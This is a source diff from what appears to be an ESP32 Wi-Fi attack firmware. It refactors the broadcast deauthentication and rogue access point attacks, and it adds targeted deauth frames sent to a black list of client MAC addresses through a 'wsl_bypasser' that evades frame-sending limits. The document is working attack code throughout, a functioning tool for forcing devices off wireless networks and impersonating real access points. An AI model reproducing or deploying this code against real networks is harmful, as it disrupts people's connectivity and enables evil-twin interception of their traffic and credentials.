@@ -10,46 +10,66 @@
 
 #include <cstring>
 #include <string>
-#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
-#include <mutex>
+#include <vector>
 
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "Timer.h"
 #include "esp_err.h"
 #include "esp_log.h"
-#include "esp_timer.h"
 #include "esp_wifi_types.h"
 #include "wifi_controller.h"
 #include "wsl_bypasser.h"
 
 namespace {
 const char* LOG_TAG = "main:attack_method";
-esp_timer_handle_t deauth_timer_handle{nullptr};
-esp_timer_handle_t rogueap_timer_handle{nullptr};
+constexpr uint8_t kMaxBLMacsPerIteration{20};
 
-ap_records_t gApRecordsForBroadcast;
+struct BroadcastAttackData {
+  ap_records_t apRecords;
 
-typedef struct {
-  bool isAttackInProgress{false};
-  uint8_t current_ap_idx{0};
+  std::vector<uint8_t> staionMacsBlackList;
+  // These are indexes in apRecords and in staionMacsBlackList showing, where did we stop last time while sending
+  // personalized deauth frames to APs from black list.
+  // We can not send all personalized deauth frames every time when broadcast deauth is sent, because it requires too
+  // high WiFi TX speed. Based on my tests we can safely process about 20 MACs from black list per second. The rest will
+  // be processed next time when broadcast attack is activated (once per second by default)
+  uint16_t currentBlApIdx{0};
+  uint16_t currentBlMacIdx{0};
+};
+Timer gDeauthFrameSenderTimer;
+
+struct RogueApAttackData {
+  uint16_t current_ap_idx{0};
   ap_records_t ap_records;
-} multiple_rogue_ap_data_t;
-multiple_rogue_ap_data_t gMmultipleRogueApData;
-std::mutex gMmultipleRogueApDataMutex;
+};
+Timer gRogueApTimer;
 }  // namespace
 
 extern bool gShouldLimitAttackLogs;
 
+// For given AP sends deauth frame to all MACs in black list.
+// Sending is started from MAC with index currentBlIdx
+// Maximum amount of MACs that can be processed per one call of this function is maxBlMacsToBeProcessed
+// Returns number of MACs which was processed
+uint16_t sendDeauthToMacsForAp(const std::shared_ptr<const wifi_ap_record_t>& apRecord,
+                               const std::vector<uint8_t>& staionMacsBlackList, uint16_t currentBlIdx,
+                               uint16_t maxBlMacsToBeProcessed, const bool& isStopRequested) {
+  const uint16_t blSize = staionMacsBlackList.size() / 6;
+  uint16_t macsLeftForThisAP = blSize - currentBlIdx;
+  uint16_t numOfMacsPerRequest = std::min(maxBlMacsToBeProcessed, macsLeftForThisAP);
+  wsl_bypasser_send_deauth_frame_to_targets(apRecord.get(), staionMacsBlackList.data() + 6 * currentBlIdx,
+                                            numOfMacsPerRequest, &isStopRequested);
+  return numOfMacsPerRequest;
+}
+
 /**
  * @brief Callback for periodic deauthentication frame timer
  *
- * Periodicaly called to send deauthentication frame for given AP
- *
- * @param arg expects structure of type ap_records_t describing ap_records
+ * Periodicaly called to send deauthentication frame for given APs
  */
-static void timer_send_deauth_frame(void* arg) {
-  ap_records_t* ap_records = (ap_records_t*)arg;
-
+void send_deauth_frame(BroadcastAttackData& broadcastAttackData, const bool& isStopRequested) {
   std::string ap_ssids;
-  for (const auto& ap_record : *ap_records) {
+  for (const auto& ap_record : broadcastAttackData.apRecords) {
     ap_ssids += (const char*)ap_record->ssid;
     ap_ssids += ", ";
   }
@@ -66,41 +86,75 @@ static void timer_send_deauth_frame(void* arg) {
     ESP_LOGI(LOG_TAG, "Sending deauth frame to APs with SSIDs [%s]", ap_ssids.c_str());
   }
 
-  for (const auto& ap_record : *ap_records) {
-    wsl_bypasser_send_deauth_frame(ap_record.get());
+  // Send all broadcast frames first
+  for (const auto& ap_record : broadcastAttackData.apRecords) {
+    wsl_bypasser_send_broadcast_deauth_frame(ap_record.get());
+  }
+
+  // Black list is empty
+  if (broadcastAttackData.staionMacsBlackList.size() == 0) {
+    return;
+  }
+
+  // Then process AP MAC black list.
+  // Process maximum kMaxBLMacsPerIteration per one send_deauth_frame() call,
+  // because ESP32 is very slow at sending raw TX frames
+  uint8_t numOfApsToProcess = broadcastAttackData.apRecords.size();
+  uint8_t numOfMacsToProcess = kMaxBLMacsPerIteration;
+  while (numOfApsToProcess > 0) {
+    if (isStopRequested) {
+      return;
+    }
+
+    const auto& currentApRecord = broadcastAttackData.apRecords[broadcastAttackData.currentBlApIdx];
+    auto numOfMacsProcessed =
+        sendDeauthToMacsForAp(currentApRecord, broadcastAttackData.staionMacsBlackList,
+                              broadcastAttackData.currentBlMacIdx, numOfMacsToProcess, isStopRequested);
+    broadcastAttackData.currentBlMacIdx += numOfMacsProcessed;
+    numOfMacsToProcess -= numOfMacsProcessed;
+    if (broadcastAttackData.currentBlMacIdx < broadcastAttackData.staionMacsBlackList.size() / 6) {
+      // Processed max possible num of MACs per this iteration. The rest MACs will be processed on next iteration
+      break;
+    }
+
+    // We sent deauth frame to all MACs from black list for current AP. Swithch to next AP.
+    broadcastAttackData.currentBlMacIdx = 0;
+
+    --numOfApsToProcess;
+    // Loop currentBlApIdx all over apRecords array
+    ++broadcastAttackData.currentBlApIdx;
+    if (broadcastAttackData.currentBlApIdx >= broadcastAttackData.apRecords.size()) {
+      broadcastAttackData.currentBlApIdx = 0;
+    }
   }
 }
 
 /**
- * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
+ * @details Starts periodic timer for sending deauthentication frame
  */
-void attack_method_broadcast(const ap_records_t& ap_records, unsigned period_sec) {
-  // Create copy of shared ptrs = share ownership. So, in case someone will rescan APs, these APs will not be deleted
-  gApRecordsForBroadcast = ap_records;
+void attack_method_broadcast(const ap_records_t& ap_records, unsigned period_sec,
+                             const MacContainer& staionMacsBlackList) {
+  // Stop previous attack if it was not stopped yet
+  gDeauthFrameSenderTimer.stop();
 
-  esp_timer_create_args_t deauth_timer_args{};
-  deauth_timer_args.callback = &timer_send_deauth_frame;
-  deauth_timer_args.arg = (void*)&gApRecordsForBroadcast;
+  BroadcastAttackData broadcastAttackData{};
+  // Create copy of shared ptrs = share ownership. So, in case someone will rescan APs, these APs will not be deleted
+  broadcastAttackData.apRecords = ap_records;
+  // Also copy all MACs from black list. So, adding new MACs will not affect/corrupt this attack
+  broadcastAttackData.staionMacsBlackList = staionMacsBlackList.getStorage();
 
   // Call for the first time
-  timer_send_deauth_frame((void*)&ap_records);
+  send_deauth_frame(broadcastAttackData, {false});
 
-  ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
-  ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
+  gDeauthFrameSenderTimer.start(
+      period_sec,
+      [broadcastAttackData = std::move(broadcastAttackData)](const bool& isStopRequested) mutable {
+        send_deauth_frame(broadcastAttackData, isStopRequested);
+      },
+      true);
 }
 
-void attack_method_broadcast_stop() {
-  if (deauth_timer_handle == nullptr) {
-    // Nothing to stop
-    return;
-  }
-  if (esp_timer_is_active(deauth_timer_handle)) {
-    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
-  }
-  ESP_ERROR_CHECK(esp_timer_delete(deauth_timer_handle));
-  deauth_timer_handle = nullptr;
-  gApRecordsForBroadcast = {};
-}
+void attack_method_broadcast_stop() { gDeauthFrameSenderTimer.stop(); }
 
 /**
  * @details Starts offering new Rogue AP in the list
@@ -124,28 +178,13 @@ void start_rogue_ap(const wifi_ap_record_t* ap_record) {
  * @brief Callback for periodic Rogue AP timer
  *
  * Periodicaly called to switch to new Rogue AP in the list
- *
- * @param arg expects structure of type multiple_rogue_ap_data_t describing Rogue APs
  */
-void timer_change_rogue_ap(void* arg) {
-  multiple_rogue_ap_data_t* multiple_rogue_ap_data = (multiple_rogue_ap_data_t*)arg;
-  std::shared_ptr<const wifi_ap_record_t> current_wifi_ap_record_ptr;
-  {
-    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
-    if (multiple_rogue_ap_data->ap_records.empty()) {
-      // Looks like global data structure was deleted.
-      return;
-    }
-    current_wifi_ap_record_ptr = multiple_rogue_ap_data->ap_records[multiple_rogue_ap_data->current_ap_idx];
-    ++multiple_rogue_ap_data->current_ap_idx;
-    if (multiple_rogue_ap_data->current_ap_idx >= multiple_rogue_ap_data->ap_records.size()) {
-      multiple_rogue_ap_data->current_ap_idx = 0;
-    }
+void change_rogue_ap(RogueApAttackData& rogueApAttackData, const bool& isStopRequested) {
+  const auto& current_wifi_ap_record_ptr = rogueApAttackData.ap_records[rogueApAttackData.current_ap_idx];
+  ++rogueApAttackData.current_ap_idx;
+  if (rogueApAttackData.current_ap_idx >= rogueApAttackData.ap_records.size()) {
+    rogueApAttackData.current_ap_idx = 0;
   }
-
-  // We hold shared_ptr to AP, so, even if rescan will happen in another thread, information about this AP will not be
-  // deleted. In similar way, if stop_attack() is called and multiple_rogue_ap_data->ap_records is deleted, we anyway
-  // have data, untill we destroy this shared_ptr
   start_rogue_ap(current_wifi_ap_record_ptr.get());
 }
 
@@ -158,26 +197,20 @@ void timer_change_rogue_ap(void* arg) {
  * @param per_ap_timeout how long to establish each Rogue AP
  */
 void start_multiple_rogue_ap_attack(const ap_records_t& ap_records, uint16_t per_ap_timeout) {
-  void* timerData{nullptr};
-  {
-    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
-    gMmultipleRogueApData = {};
-    gMmultipleRogueApData.isAttackInProgress = true;
-    gMmultipleRogueApData.current_ap_idx = 0;
-    // Create copy of shared ptrs = share ownership. So, in case someone will rescan APs, these APs will not be deleted
-    gMmultipleRogueApData.ap_records = ap_records;
-    timerData = &gMmultipleRogueApData;
-  }
-
-  esp_timer_create_args_t rogueap_timer_args{};
-  rogueap_timer_args.callback = &timer_change_rogue_ap;
-  rogueap_timer_args.arg = timerData;
-  ESP_ERROR_CHECK(esp_timer_create(&rogueap_timer_args, &rogueap_timer_handle));
+  RogueApAttackData rogueApAttackData{};
+  rogueApAttackData.current_ap_idx = 0;
+  // Create copy of shared ptrs = share ownership. So, in case someone will rescan APs, these APs will not be deleted
+  rogueApAttackData.ap_records = ap_records;
 
   // Call for the first time
-  timer_change_rogue_ap(timerData);
+  change_rogue_ap(rogueApAttackData, {false});
 
-  ESP_ERROR_CHECK(esp_timer_start_periodic(rogueap_timer_handle, per_ap_timeout * 1000000));
+  gRogueApTimer.start(
+      per_ap_timeout,
+      [rogueApAttackData = std::move(rogueApAttackData)](const bool& isStopRequested) mutable {
+        change_rogue_ap(rogueApAttackData, isStopRequested);
+      },
+      true);
 }
 
 /**
@@ -189,15 +222,8 @@ void start_multiple_rogue_ap_attack(const ap_records_t& ap_records, uint16_t per
  * @param per_ap_timeout how long to establish each Rogue AP
  */
 void attack_method_rogueap(const ap_records_t& ap_records, uint16_t per_ap_timeout) {
-  bool isAttackInProgress{false};
-  {
-    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
-    isAttackInProgress = gMmultipleRogueApData.isAttackInProgress;
-  }
-  if (isAttackInProgress == true) {
-    ESP_LOGE(LOG_TAG, "Failed to start RogueAP attack: previous attack is not finished yet");
-    return;
-  }
+  // Stop previous attack if it was not stopped yet
+  gRogueApTimer.stop();
 
   if ((per_ap_timeout != 0) && (ap_records.size() > 1)) {
     // Attack multiple APs
@@ -209,18 +235,7 @@ void attack_method_rogueap(const ap_records_t& ap_records, uint16_t per_ap_timeo
 }
 
 void attack_method_rogueap_stop() {
-  if (rogueap_timer_handle != nullptr) {
-    if (esp_timer_is_active(rogueap_timer_handle)) {
-      ESP_ERROR_CHECK(esp_timer_stop(rogueap_timer_handle));
-    }
-    ESP_ERROR_CHECK(esp_timer_delete(rogueap_timer_handle));
-    rogueap_timer_handle = nullptr;
-  }
-  {
-    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
-    gMmultipleRogueApData = {};
-  }
-
+  gRogueApTimer.stop();
   wifictl_mgmt_ap_start();
   wifictl_restore_ap_mac();
 }
